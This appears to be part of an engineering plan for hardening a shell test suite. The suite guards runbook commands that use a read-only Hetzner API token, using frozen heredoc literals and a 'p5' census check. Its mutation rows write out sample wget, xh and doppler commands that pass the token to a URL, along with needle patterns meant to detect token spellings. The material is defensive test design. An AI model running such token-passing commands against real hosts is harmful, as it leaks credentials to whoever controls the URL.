| 8 | fs-v4-unquoted | `N3B_FROZEN_V4`'s heredoc made unquoted in a suite copy | RED `builder V4: frozen:` containing `is not a quoted heredoc` |
| 9 | fs-v3-id | `@ID@` added to `N3B_FROZEN_V3` in a suite copy | RED `builder V3: frozen:` containing `@ID@ placement:` |
| 10 | fs-v2-url | `servers/123931471` made `servers/@ID@` in `N3B_FROZEN_V2` in a suite copy | RED `builder V2: frozen:` containing `@ID@ placement:` |
| 11 | fs-r-unquoted | `N3B_FROZEN_R`'s heredoc made unquoted in a suite copy (pins R in the key list) | RED `builder R: frozen:` containing `is not a quoted heredoc` |
| 12 | hb (own dispatch) | `n3b` called with a web1 pin that is empty, equal to the pin, or equal to the retired id | exactly one line, `slot:` |
| 13 | gVr12 | V3, both: ` $N3B_V3_URL \| jq .` appended after the real jq filter inside the `sh -c` body, so the anchor pair occurs twice (deepen F1: red under the last-occurrence cut, green under a first-occurrence `%%` cut, so it pins the direction) | RED `V3:curl-argv` |
| 14 | gVr13 | V3, both: `volumes?name=` replaced by `volumesXname=` (deepen A3: pins that `?` is literal in both the V3 anchor and the V3 arm) | RED `V3:curl-argv` |

Each fs row pins its reason, not only the `frozen:` prefix. A `no N3B_FROZEN_<K> heredoc` line counts as
`(did-not-land)`, never as caught, so a copy that deleted the heredoc cannot satisfy a row.

Cut at plan review as duplicates of row 7, which reaches the same shared checks on every V kind (DHH, code-simplicity):
a URL before the anchor, `$(env)` in V3's filter, a dropped slot, an argv `-H` on V4, and a quote-joined second URL.

**Harness rows.**

| # | Edit | Expected |
| --- | --- | --- |
| H-d | `_h18_vbld` in `builder-only` mode (the runbook copy left unedited), on gVr1's edit | reported `gVr1x(precondition)`, never counted as caught |
| H-e | gVr2's real edit with the wrong want `V2:frozen` | reported `uncaught`. With its right want, it is gVr2 itself and stays quiet |
| H-f | `_h18_red` fed one `builder V3: env-dump: ...` line | reduces to `V3:env-dump`, so a V line survives the reduction |
| H-g | a V row whose A is absent from the builder text | reported `(did-not-land)` |
| H-i | `_h18_vbld` `both`, legal edit `servers/123931471` to `servers/123931472` (deepen A1) | want `''`: a broken override or a `both` literal that does not take effect would print `V2:curl-argv` |
| H-j | the same legal edit, `built` | want exactly `V2:frozen` (no `curl-argv`), so the anchor passes a legal id and only the literal disagrees |
| H18_ROWS | `_h18_judge`, `_h18_silent`, `_h18_bld`, `_h18_fs` and `_h18_vbld` each increment `H18_RUN` on entry; H18 requires `H18_RUN` to equal the declared `H18_ROWS`, the same pattern as H3's `TABLE_ROWS` (CTO: ACCEPT) | a deleted helper call or an early return reds H18. Checked inside H18's one assertion, so `FLOOR` is unchanged |

**Anchor.** The literals live in the suite and the runbook in another file. A weakening that keeps N3b green must edit
the builder, the literal and the runbook in one diff, and it still meets the defence lists (rows 2-7). The server id
`123931471` and the V3 name sit in the heredocs and in the per-kind allow-list, never in a value read from the runbook.
Declared limit: a reviewed diff can edit all of them together. The per-kind URL arm is defence in depth behind the end
anchor and the `key=url` at-most-once check: when the anchor matches, `seg` already holds the kind's own URL, so no row
isolates the arm (deepen A2, CTO: DECLARE).

### Guard 2 — census arm p5: a token spelling on any logical line must be D or R

**Property.** In runbook 6894 and the postmerge skill, every logical line (`\` continuations joined) that contains
`$HCLOUD_TOKEN`, `${HCLOUD_TOKEN`, `--only-secrets HCLOUD`, `--only-secrets=HCLOUD` or `secrets get HCLOUD`
(case-sensitive) must equal D or R once its leading whitespace is stripped.

**Assembly.** `n3b_census` is the one pass over every line of each file. `n3b` calls it twice, once per document, and
g1r5 and g1r13 already pin the skill's call. p5 is one clause in `flush()`, which sees every logical line. There is no
second route.

**Mutation matrix.** Each row runs on a copy pair through `_h18_judge`, which runs `n3b`. Rows inserted into the 5c
fence use `n3b_ins "$_5s" "$_5e" "$_h18_r" <line>`, so the destroy fence stays exactly D. Prose rows use
`n3b_ins "$_ds" "$_de" 'Expect `404`.' <line>`.

| # | Row | Mutation | Expected |
| --- | --- | --- | --- |
| 1 | g5r1 | the issue's xh line, verbatim, in the 6894 section-5c fence after R | RED `unclassified p5: inngest-luks-cutover-6894.md:<its line>` |
| 2 | g5r2 | `wget -q --header="X-Token: $HCLOUD_TOKEN" -O - "$U"` (only `$HCLOUD_TOKEN`; the write token, deepen A4) | RED `unclassified p5:` |
| 3 | g5r3 | `xh -a "${HCLOUD_TOKEN_READONLY}" "$U"` (only `${HCLOUD_TOKEN`) | RED `unclassified p5:` |
| 4 | g5r4 | `doppler run -p soleur -c prd_terraform --only-secrets HCLOUD_TOKEN -- xh -A bearer "$U"` (only `--only-secrets HCLOUD`; the write token, deepen A4) | RED `unclassified p5:` |
| 5 | g5r5 | the same with `--only-secrets=HCLOUD_TOKEN_READONLY` (only `--only-secrets=HCLOUD`) | RED `unclassified p5:` |
| 6 | g5r6 | `T=$(doppler secrets get HCLOUD_TOKEN_READONLY --plain)` (only `secrets get HCLOUD`) | RED `unclassified p5:` |
| 7 | g5r8 | `xh -a "$HCLOUD_\` then `TOKEN_READONLY" "$U"` (the needle exists only on the joined line; the continuation line has NO leading whitespace, since the join deletes only `\` and the newline) | RED `unclassified p5:` at the start line |
| 8 | g5s1 (`_h18_silent`) | synthetic near misses in the 5c fence: `echo "$HCLOUD_URL"`, `--only-secrets SENTRY_DSN`, `secrets get SENTRY_DSN`, and a bare `HCLOUD_TOKEN_READONLY` in prose (deepen A6: pins against needle widening independently of today's document text) | silent |

Rows 1-7 pin their start line with `_h18_at`, as g1r15 does, not only the `unclassified p5:` prefix (deepen A5).

Rows 2-6 each hold exactly one needle, so deleting any one needle leaves its own row uncaught. Deleting `$HCLOUD_TOKEN`
also leaves g5r8 uncaught, since its joined line holds only that needle. g5r1 holds two needles (`--only-secrets HCLOUD`
and `$HCLOUD_TOKEN`) and survives any single deletion.

**Harness rows.** The existing reworded-copy row `ha` stays silent with p5 present. The must-PASS property P5 (bare names
stay legal) is carried by the real documents: runbook 6894 (:360, :424-:432) and the skill (:516-:523) name the token
bare, and the base N3b assertion requires the exact `seen` output. A needle matching bare names would turn the base red.
A separate H-h row was cut at plan review for this reason.

**Anchor.** The needle list is suite text. Removing a needle and its row in one diff passes, and that is a reviewed change.
Rows 2-6 make such a removal visible as a deleted row. The renamed-token and read-by-name-without-`$` residuals stay
declared in limit 5.

## User-Brand Impact

**If this lands broken, the user experiences:** a false red on any PR that edits runbook 6604, runbook 6894 or the
postmerge skill, which blocks unrelated documentation work until fixed. Or a false green, which reopens a path where a
copy-pasted runbook command sends the read-only Hetzner token to a second host or onto a process argument list.

**If this leaks, the user's workflow is exposed via:** an operator who runs a runbook verify command that carries the
read-only bearer to an attacker URL or into `ps` output. The token is read-only (the Read permission), so the exposure is
inventory and protection-flag disclosure, not mutation.

**Brand-survival threshold:** none

- threshold: none, reason: test-suite hardening over a read-only token's documentation surface; the diff touches no path
  matching preflight's sensitive-path regex (`plugins/soleur/test/` and `knowledge-base/project/plans/archive/` are outside it).

## Domain Review

**Domains relevant:** Engineering (CTO, rulings recorded).

### Engineering

**Status:** reviewed
**Assessment:** The CTO ruled the binding design (a, b) and six implementation forks (F1-F6) plus three concerns, all
recorded in `decision-challenges.md`. No other domain is touched: no user-facing surface, copy, legal text, cost or
operations step.

## Scope Check

### Ask Mapping

| # | User ask (verbatim) | Plan item | Status |
| --- | --- | --- | --- |
| 1 | "the three runbook-6604 verify lines in rb_expected ... get the same protection D and R have: a frozen literal each in a quoted heredoc checked by n3b_frozen_self" [brief] | Part (a) steps 1-3 | mapped |
| 2 | "AND the four defence checks (slots, residual, curl-argv, env-dump) run on both the built line and the literal" [brief] | Part (a) steps 4-5 | mapped |
| 3 | "the curl-argv allow-list is keyed per line kind (V2 only servers/<digits>, V3 only the quoted volumes?name=<literal>, V4 only volumes/<digits>, end anchor = URL followed by ' \| jq')" [brief] | Part (a) step 4 | mapped |
| 4 | "N3B_END and the D/R allow-list stay byte-identical" [brief] | Part (a) step 4; AC3 | mapped |
| 5 | "add an H18 row for the second-URL edit" [brief] | Guard 1 rows gVr1/gVr2 | mapped |
| 6 | "add census arm p5 to n3b_census, case-sensitive, matching $HCLOUD_TOKEN, ${HCLOUD_TOKEN, --only-secrets HCLOUD, --only-secrets=HCLOUD and secrets get HCLOUD" [brief] | Part (b) | mapped |
| 7 | "do NOT match bare HCLOUD_TOKEN" [brief] | Part (b); the base N3b assertion over the real documents (Guard 2 harness note) | mapped |
| 8 | "add an H18 row for the xh line" [brief] | Guard 2 row g5r1 | mapped |
| 9 | "Red-first: both mutations must fail the suite before the fix lands" [brief] | Phases 0-3 | mapped |
| 10 | "Update limits 5 and 6 of the archived plan that recorded them (keep the renamed-token gap recorded under limit 5)" [brief] | Documentation; AC10 | mapped |
| 11 | "Run the pre-ready guards including lint-skill-body-budget and plugin-root-anchoring" [brief] | AC8, AC9 | mapped |
| 12 | "do not merge until main is green, and never edit the encryption-posture ledger" [brief] | Phase 4; AC12 | mapped |
| 13 | "both edits above turn the suite red, and limits 5 and 6 of the archived plan are updated" [issue #12683] | Phase 3 replay; AC5, AC10 | mapped |

### Plan-Item Provenance

| Plan item | User words cited (verbatim quote) | Verdict |
| --- | --- | --- |
| `rb_line_v2/v3/v4` extraction | — | inferred — justification: the frozen equality needs a "built line" to compare, and N3 must read the same builder, or the two can drift (ruling F6) |
| `n3b` 5th argument | — | inferred — justification: the V builders need the web1 pin, and an implicit global would hide an empty pin (ruling F3) |
| `n3b_frozen_all` and `@ID@` placement checks | — | inferred — justification: without them, dropping a key from the `_n3b` line or moving `@ID@` into a URL is silent (CTO concern 2) |
| `_h18_red` widening and F4 want strings | — | inferred — justification: otherwise H18 drops every V line and cannot see the gap (CTO concern 1, ruling F4) |
| Precondition on every V row, harness rows H-d to H-g | — | inferred — justification: Guard Contract harness rows; a vacuous helper would otherwise score every row as caught (ruling F5) |
| p5 rows g5r2-g5r6, g5r8 | asks 6, 8 | asked |
| `N3B_V3_URL` constant, `_h18_v` suffix helper, maintenance comment above `rb_expected` | — | inferred — justification: CTO devex review: one source for the two allow-list copies of the V3 name, a structural (append-only) diff for the F4 want strings, and a pointer that tells a future editor every place a V-line change must reach |
| gVr11 and fs-r-unquoted | — | inferred — justification: Kieran review: without them, `key=url` on the V arm and R's place in the `n3b_frozen_all` key list are unpinned |
| Suite comment and pass-message updates | — | inferred — justification: the comments name "plan limit 5" and "D and R" only, and would misstate the guard |
| Archived plan edits | ask 10 | asked |

### Split Assessment

- Subsystems touched: 2 — `plugins/soleur/test/`, `knowledge-base/project/`
- Planned files: 4 | Estimated changed lines: about 200
- Thresholds: >= 4 subsystem roots OR > 25 planned files OR > 800 estimated lines
- Recommendation: single PR

## Acceptance Criteria

- [ ] AC1 Phase 0 replay recorded in the PR body: R1 (the issue's two-file second-URL edit) and R2 (the xh line in
      runbook 6894's 5c fence) each print `=== Results: 286/286 passed, 0 failed ===` on a HEAD-of-base replay tree.
- [ ] AC2 Phase 2 red recorded: with the new rows and without the fix, the suite's H18 line is `FAIL` and names
      `uncaught:gVr1(`, `uncaught:gVr2(` and `uncaught:g5r1 ` (each label matched with its `(` or a trailing space), and
      the fs-V rows report `(did-not-land)`.
- [ ] AC3 `N3B_END` and the D/R allow-list arms are byte-identical to the merge base. The selector below prints 6 base
      lines (check that count first, so a pattern that matches nothing cannot pass silently), and each still occurs
      exactly once on HEAD:
      `git show "$(git merge-base origin/main HEAD)":plugins/soleur/test/sole-copy-drift-check.test.sh | grep -E '^N3B_END=|^      (--disable\|-sS\) ;;|--noproxy\|--config|https://api.hetzner.cloud/v1/volumes/\*\) key=url)|^        case "\$o \$v" in |^      \*\) bad\+=" \$o" ;;$' | while IFS= read -r l; do grep -cxF -- "$l" plugins/soleur/test/sole-copy-drift-check.test.sh; done | sort -u`
      prints `1`.
- [ ] AC4 `bash plugins/soleur/test/sole-copy-drift-check.test.sh` prints `=== Results: 286/286 passed, 0 failed ===`, and its
      N3b and H18 lines are `pass:`.
- [ ] AC5 Phase 3c: on a replay of the fixed head, R1 (re-made in `rb_line_v2` and runbook 6604) makes N3b FAIL naming
      `builder V2: frozen:` and `builder V2: curl-argv:` while N3 stays `pass:`, and R2 makes N3b FAIL naming
      `unclassified p5:`.
- [ ] AC6 `grep -c "^IFS= read -r -d '' N3B_FROZEN_\(D\|R\|V2\|V3\|V4\) <<'N3B_EOF' || true$" plugins/soleur/test/sole-copy-drift-check.test.sh`
      prints `5`.
- [ ] AC7 `FLOOR=286` and `TABLE_ROWS=149` are unchanged, and the realized count in AC4 equals `FLOOR`. Why unchanged:
      H18 stays one assertion however many rows it judges, and `TABLE_ROWS` counts H3's `end_row` rows, which this plan
      does not touch (deepen A8). The new `H18_ROWS` constant is checked inside H18's one assertion, so it adds no
      assertion.
- [ ] AC8 `python3 scripts/lint-skill-body-budget.py --base "$(git merge-base origin/main HEAD)"` exits 0, and
      `(cd apps/web-platform && npx vitest run test/plugin-root-anchoring.test.ts)` passes.
- [ ] AC9 `bash .claude/hooks/grep-q-pipe-guard.test.sh` passes (`PJ_TRIPLES` unchanged, or recomputed by its documented
      recipe with the reason recorded).
- [ ] AC10 The archived plan's item 5 names p5 and H18 row g5r1 and still records the renamed-token gap (and the no-`$`
      read-by-name gap). Item 6 names `N3B_FROZEN_V2/V3/V4` and rows gVr1/gVr2, and no longer says "only D and R are frozen".
      Item 5 names the Doppler-spelling and `--name-transformer` residuals, and item 6 names #12752 and the open
      env-dump list.
- [ ] AC11 `git diff --name-only origin/main...HEAD` lists only: the suite, the archived 2026-11-11 plan, this plan (or its
      `plans/archive/<ts>-` copy), the `specs/[archive/<ts>-]feat-one-shot-12683-n3b-census/` files
      `decision-challenges.md`, `tasks.md` and `session-state.md`, and at most one new
      `knowledge-base/project/learnings/**/*.md`. Neither runbook and no encryption-posture file appears.
- [ ] AC12 The merge happens only after main's CI is green at main's current tip:
      `git fetch origin main && gh run list --branch main --workflow ci.yml --status completed -L 1 --json conclusion,headSha --jq '.[0] | "\(.headSha) \(.conclusion)"'`
      prints `$(git rev-parse origin/main) success` (filtered on `headSha`, so an older or in-progress run cannot satisfy it). Until then the PR stays open, ready, with its checks green.

## Test Scenarios

1. The suite on the fixed tree: 286/286 (AC4).
2. Every Guard 1 and Guard 2 row is caught, every must-PASS row is silent, and every instrument row reports both ways
   (inside H18's single assertion).
3. The R1 and R2 replays: green before, red after (AC1, AC5).
4. Pipe guard, skill-body budget and plugin-root anchoring pass (AC8, AC9).

## Sharp Edges

- A plan whose `## User-Brand Impact` section is empty, contains only placeholder text, or omits the threshold fails
  `deepen-plan` Phase 4.6. Fill it before requesting deepen-plan or `soleur:work`.
- Do not put a p5 row in the destroy section's fence. `destroy-fence:` fires on any extra line there, and the row would be
  caught for the wrong reason. Use the 5c fence (after R) or prose.
- The V3 URL is matched as a fixed string (`N3B_V3_URL`), never as a regex or an unquoted `case` glob. Both an
  unescaped regex `?` and an unquoted glob `?` match any character, so `volumes?name=` would match `volumesXname=`.
- In `both` rows, build the V literal as `rb_line_v<k> @ID@` (the existing D/R idiom). Never rebuild it by replacing the pin
  in a rendered line, since a pin that is a substring of `123931471` would corrupt V2.
- R1's sed replacement holds `/`, so use `#` as the delimiter. R2's awk passes the R text through `ENVIRON`, never `-v`.
- In Phase 3c, R1 must edit `rb_line_v2`'s body only. `N3B_FROZEN_V2` holds the same `servers/123931471 | jq -c` text, so a
  file-wide sed would edit the builder and the literal together. That is the `both` shape: `frozen:` would stay silent
  and AC5 would fail because of the harness, not the fix.
- `n3b_ins` inserts after the first line *starting with* A. D and R start at column 0 in runbook 6894 (lines 357, 415),
  and R at column 0 in the skill (line 506). Re-check before relying on it.
- Runbook 6604's verify lines sit 5 spaces deep inside their fence (`fence1` strips that indentation). `_h18_vbld` must
  find its target line by comparing the text *after* the leading whitespace with the real `rb_line_<k>` output, then edit
  only that line. `servers/123931471` and the `volumes?name=` literal each occur exactly once in the runbook (lines 363
  and 364), so a misplaced edit is visible. Assert the edited copy differs from the source in exactly one line.
- AC3 counts each main D/R arm line with `grep -cxF`. A new V arm that repeats one of those lines verbatim (for example
  `      --disable|-sS) ;;` at the same indentation) makes the count 2. Write the V `case` inside the new `if` branch at its own
  indentation, so no line is a byte copy of a D/R arm.
- A suite run takes about 4.5 minutes. Run it in the background and wait on its `=== Results` line. Never chain sleeps.
